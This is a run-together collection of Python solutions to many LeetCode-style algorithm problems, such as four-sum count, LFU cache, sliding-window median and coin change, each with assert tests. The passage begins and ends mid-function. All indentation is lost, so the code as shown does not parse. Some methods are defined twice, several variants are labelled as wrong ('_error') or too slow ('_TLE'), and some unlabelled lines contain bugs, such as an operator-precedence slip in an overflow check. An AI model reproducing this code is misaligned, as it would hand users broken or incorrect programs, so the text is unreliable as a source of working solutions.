AB[A[i] + B[j]] += 1
CD[C[i] + D[j]] += 1
ret = 0
for gross, count in AB.items():
target = 0 - gross
ret += count * CD[target]
return ret
if __name__ == "__main__":
A = [ 1, 2]
B = [-2,-1]
C = [-1, 2]
D = [ 0, 2]
assert Solution().fourSumCount(A, B, C, D) == 2
class Solution:
def findContentChildren(self, g, s):
g.sort()
s.sort()
ret = 0
i = 0
j = 0
while i < len(g) and j < len(s):
if g[i] <= s[j]:
ret += 1
i += 1
j += 1
else:
j += 1
return ret
if __name__ == "__main__":
assert Solution().findContentChildren([10,9,8,7], [5,6,7,8]) == 2
class Solution:
def find132pattern(self, nums):
stack = []
mini = float('Inf')
for v in nums:
while stack and stack[-1][1] <= v:
stack.pop()
if stack and stack[-1][0] < v:
return True
mini = min(mini, v)
stack.append((mini, v))
return False
def find132pattern_TLE(self, nums):
for i in range(len(nums)):
maxa = nums[i]
for j in range(i + 1, len(nums)):
if nums[j] > nums[i]:
if nums[j] < maxa:
return True
maxa = max(maxa, nums[j])
return False
if __name__ == "__main__":
assert Solution().find132pattern([1, 2, 3, 4]) == False
assert Solution().find132pattern([3, 1, 4, 2]) == True
assert Solution().find132pattern([-1, 3, 2, 0]) == True
assert Solution().find132pattern([-2, 1, 1]) == True
class Solution:
def repeatedSubstringPattern(self, s):
return s in (s + s)[1:-1]
def repeatedSubstringPattern_error(self, s):
if not s:
return False
p1 = 0
e = 1
p2 = 1
while p2 < len(s):
if s[p1] == s[p2]:
p1 += 1
if p1 == e:
p1 = 0
else:
p1 = 0
e = p2 + 1
p2 += 1
return p2 == len(s) and p1 == 0 and e != len(s)
if __name__ == "__main__":
assert Solution().repeatedSubstringPattern("abab") == True
assert Solution().repeatedSubstringPattern("abcd") == False
assert Solution().repeatedSubstringPattern("abacababacab") == True
from collections import defaultdict, OrderedDict
DUMMY = None
class LFUCache:
def __init__(self, capacity: int):
self.cap = capacity
self.values = {}
self.freqs = defaultdict(int)
self.keys = defaultdict(OrderedDict)
self.mini = -1
def get(self, key: int) -> int:
if key in self.values:
val = self.values[key]
freq_org = self.freqs[key]
self.freqs[key] += 1
del self.keys[freq_org][key]
self.keys[freq_org + 1][key] = DUMMY
if freq_org == self.mini and len(self.keys[self.mini]) == 0:
self.mini = freq_org + 1
return val
else:
return - 1
def put(self, key: int, value: int) -> None:
if self.cap == 0:
return
if key in self.values:
self.values[key] = value
self.get(key)
else:
if len(self.values) >= self.cap:
evit_key, _ = self.keys[self.mini].popitem(last=False)
del self.values[evit_key]
del self.freqs[evit_key]
self.values[key] = value
self.freqs[key] = 0
self.keys[0][key] = DUMMY
self.get(key)
self.mini = 1
class Solution:
def hammingDistance(self, x, y):
diff = x ^ y
ret = 0
while diff:
ret += diff & 1
diff >>= 1
return ret
if __name__ == "__main__":
assert Solution().hammingDistance(3, 1) == 1
assert Solution().hammingDistance(1, 4) == 2
class Solution:
def pivot(self, A, lo, hi):
pivot = lo
closed = pivot
for i in range(lo + 1, hi):
if A[i] < A[pivot]:
closed += 1
A[closed], A[i] = A[i], A[closed]
A[closed], A[pivot] = A[pivot], A[closed]
return closed
def quick_select(self, nums, lo, hi, k):
pivot = self.pivot(nums, lo, hi)
if pivot == k:
return nums[pivot]
elif pivot > k:
return self.quick_select(nums, lo, pivot, k)
else:
return self.quick_select(nums, pivot + 1, hi, k)
def minMoves2(self, nums):
n = len(nums)
median = self.quick_select(nums, 0, n, n//2)
return sum(map(lambda x: abs(x - median), nums))
def find_median(self, nums):
n = len(nums)
nums.sort()
return nums[n//2]
def minMoves2_error(self, nums):
n = len(nums)
avg = round(sum(nums) / n)
return sum(map(lambda x: abs(x - avg), nums))
if __name__ == "__main__":
assert Solution().minMoves2([1,2,3]) == 2
assert Solution().minMoves2([1,0,0,8,6]) == 14
class Solution:
dirs = [(0, -1), (-1, 0), (0, 1), (1, 0)]
def islandPerimeter(self, grid):
ret = 0
if not grid:
return ret
R = len(grid)
C = len(grid[0])
for r0 in range(R):
for c0 in range(C):
if grid[r0][c0] == 1:
for dr, dc in self.dirs:
r = r0 + dr
c = c0 + dc
if r < 0 or r >= R or c < 0 or c >= C:
ret += 1
elif grid[r][c] == 0:
ret += 1
return ret
if __name__ == "__main__":
grid = [
[0,1,0,0],
[1,1,1,0],
[0,1,0,0],
[1,1,0,0],
]
assert Solution().islandPerimeter(grid) == 16
class Solution:
def canIWin(self, maxChoosableInteger, desiredTotal):
cache = {}
choices = frozenset([choice for choice in range(1, maxChoosableInteger + 1)])
return self._can_win(desiredTotal, choices, sum(choices), cache)
def _can_win(self, total, choices, gross,cache):
if (total, choices) in cache:
return cache[(total, choices)]
ret = False
if max(choices) >= total:
ret = True
elif gross < total:
ret = False
else:
for choice in choices:
if not self._can_win(
total - choice,
choices - set([choice]),
gross - choice,
cache
):
ret = True
break
cache[(total, choices)] = ret
return ret
if __name__ == "__main__":
assert Solution().canIWin(10, 11) == False
assert Solution().canIWin(10, 0) == True
assert Solution().canIWin(13, 11) == True
class Solution:
def findSubstringInWraproundString(self, p):
counter = {
c: 1
for c in p
}
l = 1
for i in range(1, len(p)):
if (ord(p[i]) - ord(p[i-1])) % 26 == 1:
l += 1
else:
l = 1
counter[p[i]] = max(counter[p[i]], l)
return sum(counter.values())
def findSubstringInWraproundString_error(self, p):
if not p:
return 0
ret = set()
i = 0
while i < len(p):
cur = [p[i]]
j = i + 1
while j < len(p) and (ord(p[j]) - ord(cur[-1]) == 1 or p[j] == "a" and cur[-1] == "z"):
cur.append(p[j])
j += 1
ret.add("".join(cur))
i = j
return sum(map(lambda x: (len(x) + 1) * len(x) // 2, ret))
if __name__ == "__main__":
assert Solution().findSubstringInWraproundString("a") == 1
assert Solution().findSubstringInWraproundString("cac") == 2
assert Solution().findSubstringInWraproundString("zab") == 6
assert Solution().findSubstringInWraproundString("zaba") == 6
def rand7():
return 0
class Solution:
def rand10(self):
while True:
rv1 = rand7()
rv2 = rand7()
s = (rv1 - 1) * 7 + (rv2 - 1)
if s < 40:
return s % 10 + 1
from typing import List
from collections import defaultdict
class Solution:
def __init__(self):
TrieNode = lambda: defaultdict(TrieNode)
self.root = TrieNode()
def findAllConcatenatedWordsInADict(self, words: List[str]) -> List[str]:
words.sort(key=len)
ret = []
for w in words:
if self.can_concat(w, 0):
ret.append(w)
cur = self.root
for c in w:
cur = cur[c]
cur["end"] = True
return ret
def can_concat(self, word, lo):
if not word:
return False
k = len(word)
if lo >= k:
return True
cur = self.root
for i in range(lo, k):
cur = cur[word[i]]
if cur.get("end", False) and self.can_concat(word, i + 1):
return True
return False
class SolutionTLE:
def findAllConcatenatedWordsInADict(self, words: List[str]) -> List[str]:
ret = []
visited = set(words)
for w in words:
if self.can_concat(w, visited):
ret.append(w)
return ret
def can_concat(self, w, visited):
if not w:
return False
k = len(w)
F = [False for _ in range(k + 1)]
F[0] = True
for i in range(1, k + 1):
for j in range(i):
if j == 0 and i == k:
continue
if F[j] and w[j:i] in visited:
F[i] = True
return F[k]
if __name__ == "__main__":
assert Solution().findAllConcatenatedWordsInADict(["cat","cats","catsdogcats","dog","dogcatsdog","hippopotamuses","rat","ratcatdogcat"]) == ["catsdogcats","dogcatsdog","ratcatdogcat"]
class Solution:
def makesquare(self, nums):
if not nums:
return False
square = [0 for _ in range(4)]
l = sum(nums) // 4
if sum(nums) % 4 != 0:
return False
nums.sort(reverse=True)
return self.dfs(nums, 0, l, square)
def dfs(self, nums, i, l, square):
if i >= len(nums):
return True
for j in range(len(square)):
if nums[i] + square[j] <= l:
square[j] += nums[i]
if self.dfs(nums, i + 1, l, square):
return True
square[j] -= nums[i]
return False
if __name__ == "__main__":
assert Solution().makesquare([1,1,2,2,2]) == True
assert Solution().makesquare([3,3,3,3,4]) == False
from collections import Counter
class Solution:
def findMaxForm(self, strs, m, n):
if not strs:
return 0
F = [[0 for _ in range(n + 1)] for _ in range(m + 1)]
z, o = self.count(strs[0])
for i in range(m+1):
for j in range(n+1):
if i + z<= m and j + o <= n:
F[i][j] = 1
for e in range(1, len(strs)):
z, o = self.count(strs[e])
for i in range(m+1):
for j in range(n+1):
if i + z <= m and j + o <= n:
F[i][j] = max(
F[i][j],
F[i + z][j + o] + 1
)
ret = max(
F[i][j]
for i in range(m + 1)
for j in range(n + 1)
)
return ret
def count(self, s):
z, o = 0, 0
for e in s:
if e == "0":
z += 1
else:
o += 1
return z, o
def findMaxForm_TLE(self, strs, m, n):
if not strs:
return 0
F = [[[0 for _ in range(len(strs))] for _ in range(n + 1)] for _ in range(m + 1)]
count = Counter(strs[0])
for i in range(m+1):
for j in range(n+1):
if i + count["0"] <= m and j + count["1"] <= n:
F[i][j][0] = 1
for e in range(1, len(strs)):
count = Counter(strs[e])
for i in range(m+1):
for j in range(n+1):
if i + count["0"] <= m and j + count["1"] <= n:
F[i][j][e] = F[i + count["0"]][j + count["1"]][e-1] + 1
F[i][j][e] = max(F[i][j][e], F[i][j][e-1])
ret = max(
F[i][j][-1]
for i in range(m + 1)
for j in range(n + 1)
)
return ret
def findMaxForm_error(self, strs, m, n):
if not strs:
return 0
F = [[[0 for _ in range(len(strs))] for _ in range(n + 1)] for _ in range(m + 1)]
count = Counter(strs[0])
if count["0"] <= m and count["1"] <= n:
F[m - count["0"]][n - count["1"]][0] += 1
for e in range(1, len(strs)):
count = Counter(strs[e])
for i in range(m+1):
for j in range(n+1):
if count["0"] <= i and count["1"] <= j:
F[i - count["0"]][j - count["1"]][e] = F[i][j][e-1] + 1
else:
F[i][j][e] = F[i][j][e-1]
ret = max(
F[i][j][-1]
for i in range(m + 1)
for j in range(n + 1)
)
return ret
def findMaxForm_error(self, strs, m, n):
strs.sort(key=len)
ret = 0
for a in strs:
count = Counter(a)
if count["0"] <= m and count["1"] <= n:
ret += 1
m -= count["0"]
n -= count["1"]
return ret
if __name__ == "__main__":
assert Solution().findMaxForm(["10", "0001", "111001", "1", "0"], 5, 3) == 4
assert Solution().findMaxForm(["10", "0", "1"], 1, 1) == 2
assert Solution().findMaxForm(["111", "1000", "1000", "1000"], 9, 3) == 3
import bisect
class Solution:
def findRadius(self, houses, heaters):
houses.sort()
heaters.sort()
r = 0
i = 0
for h in houses:
i = bisect.bisect(heaters, h)
left = max(0, i - 1)
right = min(len(heaters) - 1, i)
r_cur = min(abs(heaters[left] - h), abs(heaters[right] - h))
r = max(r, r_cur)
return r
def findRadius_naive(self, houses, heaters):
houses.sort()
heaters.sort()
heaters.append(float('inf'))
r = 0
i = 0
for h in houses:
while h > (heaters[i] + heaters[i+1]) / 2:
i += 1
r = max(r, abs(heaters[i] - h))
return r
if __name__ == "__main__":
assert Solution().findRadius([1,2,3,4], [1,4]) == 1
class Solution:
def findComplement(self, num):
msb = 0
while num >> msb:
msb += 1
mask = (1 << msb) - 1
return mask & ~num
if __name__ == "__main__":
assert Solution().findComplement(5) == 2
class Solution:
def totalHammingDistance(self, nums):
ret = 0
while any(nums):
z, o = 0, 0
for i in range(len(nums)):
if nums[i] & 1 == 0:
o += 1
else:
z += 1
nums[i] >>= 1
ret += z * o
return ret
if __name__ == "__main__":
assert Solution().totalHammingDistance([4, 14, 2]) == 6
from typing import List
import heapq
class DualHeap:
def __init__(self):
self.max_h = []
self.min_h = []
self.max_sz = 0
self.min_sz = 0
self.to_remove = set()
def insert(self, num):
if self.max_h and num > self.max_h[0][1]:
heapq.heappush(self.min_h, (num, num))
self.min_sz += 1
else:
heapq.heappush(self.max_h, (-num, num))
self.max_sz += 1
self.balance()
def pop(self, num):
self.to_remove.add(num)
if self.max_h and num > self.max_h[0][1]:
self.min_sz -= 1
else:
self.max_sz -= 1
self.balance()
def clean_top(self):
while self.max_h and self.max_h[0][1] in self.to_remove:
_, num = heapq.heappop(self.max_h)
self.to_remove.remove(num)
while self.min_h and self.min_h[0][1] in self.to_remove:
_, num = heapq.heappop(self.min_h)
self.to_remove.remove(num)
def balance(self):
while self.max_sz < self.min_sz :
self.clean_top()
_, num =heapq.heappop(self.min_h)
heapq.heappush(self.max_h, (-num, num))
self.min_sz -= 1
self.max_sz += 1
while self.max_sz > self.min_sz + 1:
self.clean_top()
_, num = heapq.heappop(self.max_h)
heapq.heappush(self.min_h, (num, num))
self.min_sz += 1
self.max_sz -= 1
self.clean_top()
def get_median(self, k):
self.clean_top()
if k % 2 == 1:
return self.max_h[0][1]
else:
return 0.5 * (self.max_h[0][1] + self.min_h[0][1])
class Solution:
def medianSlidingWindow(self, nums: List[int], k: int) -> List[float]:
ret = []
dh = DualHeap()
for i in range(k):
dh.insert(nums[i])
ret.append(dh.get_median(k))
for i in range(k, len(nums)):
dh.insert(nums[i])
dh.pop(nums[i-k])
ret.append(dh.get_median(k))
return ret
if __name__ == "__main__":
assert Solution().medianSlidingWindow([-2147483648,-2147483648,2147483647,-2147483648,-2147483648,-2147483648,2147483647,2147483647,2147483647,2147483647,-2147483648,2147483647,-2147483648], 2)
assert Solution().medianSlidingWindow([1,1,1,1], 2) == [1, 1, 1]
assert Solution().medianSlidingWindow([1,3,-1,-3,5,3,6,7], 3) == [1,-1,-1,3,5,6]
class Solution:
def findMaxConsecutiveOnes(self, nums):
s = 0
e = 0
ret = 0
while s < len(nums):
if nums[s] == 1:
while e < len(nums) and nums[e] == 1:
e += 1
ret = max(ret, e - s)
else:
e += 1
s = e
return ret
if __name__ == "__main__":
assert Solution().findMaxConsecutiveOnes([1,1,0,1,1,1]) == 3
from collections import defaultdict
class Solution:
def PredictTheWinner(self, nums):
l = len(nums)
gross = [0]
for e in nums:
gross.append(gross[-1] + e)
F = defaultdict(lambda: defaultdict(int))
for i in range(l-1, -1, -1):
for j in range(i+1, l+1):
F[i][j] = max(
gross[j] - gross[i] - F[i+1][j],
gross[j] - gross[i] - F[i][j-1]
)
return F[0][l] >= (gross[-1] - F[0][l])
if __name__ == "__main__":
assert Solution().PredictTheWinner([1, 5, 2]) == False
assert Solution().PredictTheWinner([1, 5, 233, 7]) == True
class Solution:
def findSubsequences(self, nums):
subs = set()
for n in nums:
subs |= set([
sub + (n,)
for sub in subs
if n >= sub[-1]
])
subs.add((n,))
return [
list(sub)
for sub in subs
if len(sub) >= 2
]
def findSubsequences(self, nums):
l = len(nums)
F = [
[(nums[i],)]
for i in range(l)
]
ret = set()
for i in range(1, l):
for j in range(i):
if nums[i] >= nums[j]:
for t in F[j]:
cur = t + (nums[i],)
ret.add(cur)
F[i].append(cur)
return list(map(list, ret))
from collections import defaultdict
class Solution:
def findTargetSumWays(self, A, S):
if not A:
return
F = defaultdict(lambda: defaultdict(int))
F[0][0] = 1
for i in range(len(A)):
for k in F[i].keys():
F[i+1][k-A[i]] += F[i][k]
F[i+1][k+A[i]] += F[i][k]
return F[len(A)][S]
if __name__ == "__main__":
assert Solution().findTargetSumWays([1, 1, 1, 1, 1], 3) == 5
class Solution:
def nextGreaterElement(self, nums1, nums2):
h = {}
stk = []
for e in nums2[::-1]:
while stk and stk[-1] <= e:
stk.pop()
h[e] = stk[-1] if stk else -1
stk.append(e)
return [
h[q]
for q in nums1
]
class Solution:
def findDiagonalOrder(self, matrix):
if not matrix:
return []
R, C = len(matrix), len(matrix[0])
F = [[] for _ in range(R+C-1)]
for r in range(R):
for c in range(C):
F[r+c].append(matrix[r][c])
ret = []
for i in range(R+C-1):
if i % 2 == 1:
ret.extend(F[i])
else:
ret.extend(F[i][::-1])
return ret
def findDiagonalOrder_2(self, matrix):
if not matrix:
return []
i = 0
j = 0
inc = True
ret = []
R, C = len(matrix), len(matrix[0])
while True:
ret.append(matrix[i][j])
if i == R - 1 and j == C - 1:
break
if inc:
i -= 1
j += 1
if i < 0 or j >= C:
inc = False
if i < 0 and j < C:
i = 0
else:
i += 2
j = C - 1
else:
i += 1
j -= 1
if i >= R or j < 0:
inc = True
if j < 0 and i < R:
j = 0
else:
i = R - 1
j += 2
return ret
if __name__ == "__main__":
assert Solution().findDiagonalOrder([
[ 1, 2, 3 ],
[ 4, 5, 6 ],
[ 7, 8, 9 ]
]) == [1,2,4,7,5,3,6,8,9]
class Solution:
def findWords(self, words):
rows = [
"qwertyuiop",
"asdfghjkl",
"zxcvbnm",
]
d = {
e: i
for i, v in enumerate(rows)
for e in v
}
return [
w
for w in words
if all(d[w[0].lower()] == d[l.lower()] for l in w)
]
if __name__ == "__main__":
assert Solution().findWords(["Hello", "Alaska", "Dad", "Peace"]) == ["Alaska", "Dad"]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def findMode(self, root):
ret = [[], 0]
self.find_mode(root, [None, 0], ret, False)
self.find_mode(root, [None, 0], ret, True)
return ret[0]
def find_mode(self, root, prev, ret, collect):
if not root:
return
self.find_mode(root.left, prev, ret, collect)
if prev[0] == root.val:
prev[1] += 1
else:
prev[1] = 1
prev[0] = root.val
if not collect:
ret[1] = max(ret[1], prev[1])
else:
if prev[1] == ret[1]:
ret[0].append(root.val)
self.find_mode(root.right, prev, ret, collect)
def findMode_error(self, root):
if not root:
return []
ret = [0, []]
self.find_mode_error(root, root.val, ret)
return ret[1]
def find_mode_error(self, root, target, ret):
cur = 0
if not root:
return cur
if root.val == target:
cur += 1
cur += self.find_mode_error(root.left, root.val, ret)
cur += self.find_mode_error(root.right, root.val, ret)
if cur > ret[0]:
ret[0], ret[1] = cur, [target]
elif cur == ret[0]:
ret[1].append(target)
else:
self.find_mode_error(root, root.val, ret)
return cur
from typing import List
import heapq
class Solution:
def findMaximizedCapital(self, k: int, W: int, Profits: List[int], Capital: List[int]) -> int:
capital_q = list(zip(Capital, Profits))
profit_q = []
heapq.heapify(capital_q)
capital = W
for _ in range(k):
while capital_q and capital_q[0][0] <= capital:
_, pro = heapq.heappop(capital_q)
heapq.heappush(profit_q, (-pro, pro))
if profit_q:
_, pro = heapq.heappop(profit_q)
capital += pro
else:
break
return capital
def findMaximizedCapital_TLE(self, k: int, W: int, Profits: List[int], Capital: List[int]) -> int:
capital = W
n = len(Profits)
visited = [False for _ in range(n)]
for _ in range(k):
maxa = 0
maxa_i = 0
for i in range(n):
if not visited[i] and Profits[i] >= maxa and Capital[i] <= capital:
maxa = Profits[i]
maxa_i = i
if maxa > 0:
capital += maxa
visited[maxa_i] = True
else:
break
return capital
from bisect import bisect
class Solution:
def nextGreaterElements(self, nums):
stk = []
for n in nums[::-1]:
while stk and stk[-1] <= n:
stk.pop()
stk.append(n)
ret = []
for n in nums[::-1]:
while stk and stk[-1] <= n:
stk.pop()
ret.append(stk[-1] if stk else -1)
stk.append(n)
return ret[::-1]
def nextGreaterElements_error(self, nums):
A = nums + nums
print(A)
ret = []
for e in nums:
t = bisect(A, e)
if t == len(A):
ret.append(-1)
else:
ret.append(A[t])
print(ret)
return ret
if __name__ == "__main__":
assert Solution().nextGreaterElements([1,2,1]) == [2, -1, 2]
class Solution:
def convertToBase7(self, num):
if num == 0:
return "0"
ret = []
n = abs(num)
while n:
ret.append(n % 7)
n //= 7
ret = "".join(map(str, ret[::-1]))
if num < 0:
ret = "-" + ret
return ret
if __name__ == "__main__":
assert Solution().convertToBase7(100) == "202"
assert Solution().convertToBase7(-7) == "-10"
from typing import List
import heapq
dirs = [(0, -1), (0, 1), (-1, 0), (1, 0)]
class Solution:
def shortestDistance(self, maze: List[List[int]], start: List[int], destination: List[int]) -> int:
m, n = len(maze), len(maze[0])
D = [[float("inf") for _ in range(n)] for _ in range(m)]
i, j = start
D[i][j] = 0
q = [(0, i, j)]
while q:
dist, i, j = heapq.heappop(q)
for di, dj in dirs:
cur_dist = 0
I = i
J = j
while 0 <= I + di < m and 0 <= J + dj < n and maze[I + di][J + dj] == 0:
I += di
J += dj
cur_dist += 1
if dist + cur_dist < D[I][J]:
D[I][J] = dist + cur_dist
heapq.heappush(q, (D[I][J], I, J))
i, j = destination
return D[i][j] if D[i][j] != float("inf") else -1
if __name__ == "__main__":
assert Solution().shortestDistance([[0,0,1,0,0],[0,0,0,0,0],[0,0,0,1,0],[1,1,0,1,1],[0,0,0,0,0]], [0,4], [4,4]) == 12
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from collections import defaultdict
class Solution:
def findFrequentTreeSum(self, root):
counter = defaultdict(int)
self.traverse(root, counter)
ret = [[], 0]
for k, v in counter.items():
if v > ret[1]:
ret[0] = [k]
ret[1] = v
elif v == ret[1]:
ret[0].append(k)
return ret[0]
def traverse(self, root, counter):
if not root:
return 0
cur = root.val
cur += self.traverse(root.left, counter)
cur += self.traverse(root.right, counter)
counter[cur] += 1
return cur
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def findBottomLeftValue(self, root):
q = [root]
while q:
ret = q[0].val
cur_q = []
for e in q:
if e.left:
cur_q.append(e.left)
if e.right:
cur_q.append(e.right)
q = cur_q
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def largestValues(self, root):
ret = []
if not root:
return ret
q = [root]
while q:
ret.append(max(map(lambda e: e.val, q)))
cur_q = []
for e in q:
if e.left:
cur_q.append(e.left)
if e.right:
cur_q.append(e.right)
q = cur_q
return ret
from collections import defaultdict
class Solution:
def longestPalindromeSubseq(self, s):
n = len(s)
F = defaultdict(lambda: defaultdict(int))
for i in range(n):
F[i][i] = 1
for i in range(n-1, -1, -1):
for j in range(i+1, n):
F[i][j] = max(F[i+1][j], F[i][j-1])
if s[i] == s[j]:
F[i][j] = max(F[i][j], F[i+1][j-1] + 2)
return F[0][n-1]
if __name__ == "__main__":
assert Solution().longestPalindromeSubseq("bbbab") == 4
from collections import defaultdict
class Solution:
def change(self, amount, coins):
F = defaultdict(lambda: defaultdict(int))
n = len(coins)
for l in range(n + 1):
F[0][l] = 1
for a in range(1, amount + 1):
for l in range(1, n + 1):
F[a][l] = F[a][l-1] + F[a - coins[l-1]][l]
return F[amount][n]
def change_TLE(self, amount, coins):
if amount == 0:
return 1
coins.sort()
n = len(coins)
F = defaultdict(lambda: defaultdict(int))
for i in range(n):
F[coins[i]][i] = 1
for a in range(1, amount + 1):
for i in range(n):
for j in range(i + 1):
F[a][i] += F[a - coins[i]][j]
return sum(F[amount].values())
def change_error(self, amount, coins):
F = {0: 1}
for a in range(1, amount + 1):
F[a] = 0
for c in coins:
if a - c in F:
F[a] += F[a - c]
return F[amount]
if __name__ == "__main__":
assert Solution().change(5, [1, 2, 5]) == 4
class Solution:
def detectCapitalUse(self, word: str) -> bool:
if not word:
return True
head_upper = word[0].isupper()
has_lower = False
has_upper = False
for w in word[1:]:
if w.isupper():
has_upper = True
if has_lower or not head_upper:
return False
else:
has_lower = True
if has_upper:
return False
return True
class Solution:
def checkSubarraySum(self, nums, k):
h = {0: 0}
s = 0
for l in range(1, len(nums) + 1):
s += nums[l-1]
if k != 0:
s %= k
if s in h:
if l - h[s] >= 2:
return True
else:
h[s] = l
return False
if __name__ == "__main__":
assert Solution().checkSubarraySum([23,2,4,6,7], 6) == True
from collections import defaultdict
class Solution:
def findLongestWord(self, s, d):
h = defaultdict(list)
for d_idx, w in enumerate(d):
w_idx = 0
h[w[w_idx]].append((d_idx, w_idx))
ret = ""
for e in s:
lst = h.pop(e, [])
for d_idx, w_idx in lst:
w = d[d_idx]
w_idx += 1
if w_idx >= len(w):
ret = min(ret, w, key=lambda x: (-len(x), x))
else:
h[w[w_idx]].append((d_idx, w_idx))
return ret
if __name__ == "__main__":
assert Solution().findLongestWord("abpcplea", ["ale","apple","monkey","plea"]) == "apple"
class Solution:
def findMaxLength(self, nums):
o = 0
z = 0
d = {0: 0}
ret = 0
for i, e in enumerate(nums):
if e == 1:
o += 1
else:
z += 1
diff = o - z
if diff in d:
ret = max(ret, i + 1 - d[diff])
else:
d[diff] = i + 1
return ret
def findMaxLength_error(self, nums):
n = len(nums)
F = [0 for _ in range(n+1)]
for i in range(n):
F[i+1] = F[i]
if nums[i] == 0:
F[i+1] += 1
i = 0
j = n
while i < j:
count = F[j] - F[i]
l = j - i
if count * 2 == l:
print(l)
return l
elif count * 2 < l:
if nums[i] == 1:
i += 1
else:
j -= 1
else:
if nums[i] == 0:
i += 1
else:
j -= 1
return 0
def findMaxLength_TLE(self, nums):
F = [0]
n = len(nums)
for e in nums:
if e == 0:
F.append(F[-1] + 1)
else:
F.append(F[-1])
ret = 0
for i in range(n):
for j in range(i+1, n+1):
if (F[j] - F[i]) * 2 == j - i:
ret = max(ret, j - i)
return ret
if __name__ == "__main__":
assert Solution().findMaxLength([0, 1, 0]) == 2
assert Solution().findMaxLength([0,1,0,1,1,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1,0,1,1,0,0,0,1,0,1,0,0,1,0,1,1,1,1,1,1,0,0,0,0,1,0,0,0,1,1,1,0,1,0,0,1,1,1,1,1,0,0,1,1,1,1,0,0,1,0,1,1,0,0,0,0,0,0,1,0,1,0,1,1,0,0,1,1,0,1,1,1,1,0,1,1,0,0,0,1,1]) == 68
class Solution:
def countArrangement(self, N: int) -> int:
candidates = set(range(1, N+1))
ret = self.dfs(candidates, 1, N)
return ret
def dfs(self, candidates, i, N):
if i > N:
return 1
ret = 0
for c in candidates:
if c % i == 0 or i % c == 0:
candidates.remove(c)
ret += self.dfs(candidates, i+1, N)
candidates.add(c)
return ret
if __name__ == "__main__":
assert Solution().countArrangement(2) == 2
from typing import List
from collections import defaultdict
class Solution:
def wordsAbbreviation(self, words: List[str]) -> List[str]:
hm = defaultdict(list)
ret = [None for _ in words]
for i, w in enumerate(words):
hm[w[0], w[-1], len(w)].append(i)
TrieNode = lambda: defaultdict(TrieNode)
for lst in hm.values():
root = TrieNode()
for i in lst:
w = words[i]
cur = root
for c in w:
cur = cur[c]
cur["count"] = cur.get("count", 0) + 1
for i in lst:
w = words[i]
prefix_l = 0
cur = root
for c in w:
prefix_l += 1
cur = cur[c]
if cur["count"] == 1:
break
ret[i] = self.abbrev(w, prefix_l)
return ret
def abbrev(self, w, prefix_l):
abbrev_l = len(w) - 2 - prefix_l + 1
if abbrev_l > 1:
return w[:prefix_l] + str(abbrev_l) + w[-1]
return w
if __name__ == "__main__":
assert Solution().wordsAbbreviation(["like", "god", "internal", "me", "internet", "interval", "intension", "face", "intrusion"]) == ["l2e","god","internal","me","i6t","interval","inte4n","f2e","intr4n"]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def getMinimumDifference(self, root: 'TreeNode') -> int:
ret = [float('inf')]
self.dfs(root, ret)
return ret[0]
def dfs(self, node, ret):
if not node:
return None, None
left_min, left_max = self.dfs(node.left, ret)
right_min, right_max = self.dfs(node.right, ret)
if left_max:
ret[0] = min(ret[0], abs(node.val - left_max))
if right_min:
ret[0] = min(ret[0], abs(node.val - right_min))
left_min = left_min or node.val
right_max = right_max or node.val
return left_min, right_max
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def convertBST(self, root: 'TreeNode') -> 'TreeNode':
self.walk(root, 0)
return root
def walk(self, node, cur_sum):
if not node:
return cur_sum
s = self.walk(node.right, cur_sum)
node.val += s
return self.walk(node.left, node.val)
from typing import List
class Solution:
def findMinDifference(self, timePoints: List[str]) -> int:
ret = float("inf")
A = list(sorted(map(self.minutes, timePoints)))
n = len(A)
for i in range(n - 1):
ret = min(ret, self.diff(A[i+1], A[i]))
ret = min(ret, self.diff(A[n-1], A[0]))
return ret
def diff(self, b, a):
ret = b - a
if ret > 12 * 60:
ret = 24 * 60 - ret
return ret
def minutes(self, a):
h, m = a.split(":")
minutes = 60 * int(h) + int(m)
return minutes
if __name__ == "__main__":
assert Solution().findMinDifference(["23:59","00:00"]) == 1
from typing import List
from bisect import bisect_right
class Solution:
def singleNonDuplicate(self, nums: List[int]) -> int:
n = len(nums)
lo, hi = 0, n
while lo < hi:
mid = (lo + hi) // 2
if (
mid % 2 == 0 and mid + 1 < hi and nums[mid] == nums[mid + 1]
) or (
mid % 2 == 1 and mid - 1 >= lo and nums[mid] == nums[mid - 1]
):
lo = mid + 1
else:
hi = mid
return nums[lo]
def singleNonDuplicate_error(self, nums: List[int]) -> int:
n = len(nums)
lo, hi = 0, n
while lo < hi:
mid = (lo + hi) // 2
idx = bisect_right(nums, nums[mid], lo, hi)
if idx <= mid:
hi = mid - 1
else:
lo = mid
return nums[hi - 1]
def singleNonDuplicate_xor(self, nums: List[int]) -> int:
ret = nums[0]
for e in nums[1:]:
ret ^= e
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = 0
def diameterOfBinaryTree(self, root: TreeNode) -> int:
self.dfs(root)
return self.ret
def dfs(self, node):
if not node:
return 0
l = self.dfs(node.left)
r = self.dfs(node.right)
self.ret = max(self.ret, l + 1 + r - 1)
return max(l, r) + 1
from typing import List
from collections import defaultdict
class Solution:
def leastBricks(self, wall: List[List[int]]) -> int:
h = defaultdict(int)
m = len(wall)
for i in range(m):
s = 0
for j in range(len(wall[i]) - 1):
s += wall[i][j]
h[s] += 1
return m - max(h.values() or [0])
class Solution:
def nextGreaterElement(self, n: int) -> int:
seq = list(str(n))
N = len(seq)
if N < 2:
return -1
i = N - 2
while seq[i] >= seq[i+1]:
i -= 1
if i < 0:
return -1
j = N - 1
while seq[i] >= seq[j]:
j -= 1
seq[i], seq[j] = seq[j], seq[i]
seq[i+1:] = reversed(seq[i+1:])
ret = int("".join(seq))
if ret <= 1 << 31 - 1:
return ret
else:
return -1
def nextGreaterElement_sort(self, n: int) -> int:
seq = [int(e) for e in str(n)]
stk = []
for i in range(len(seq) - 1, -1 , -1):
e = seq[i]
popped = None
while stk and seq[stk[-1]] > e:
popped = stk.pop()
if popped:
seq[i], seq[popped] = seq[popped], seq[i]
seq[i+1:] = sorted(seq[i+1:])
ret = int("".join(map(str, seq)))
